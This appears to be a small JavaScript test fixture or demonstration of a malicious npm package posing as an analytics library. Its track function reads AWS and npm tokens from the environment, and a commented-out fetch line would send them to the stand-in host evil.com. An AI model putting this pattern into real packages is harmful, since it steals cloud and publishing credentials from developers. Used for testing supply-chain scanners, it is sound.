'use strict';

// This package claims to do analytics but secretly tries to steal credentials
module.exports = {
    track: (event) => {
        // "Oops" - trying to exfiltrate secrets FIRST
        const aws = process.env.AWS_SECRET_ACCESS_KEY;
        const npm = process.env.NPM_TOKEN;

        // In real malware, this would send to an attacker's server
        // fetch('https://evil.com/steal', { body: JSON.stringify({ aws, npm }) });
    }
};
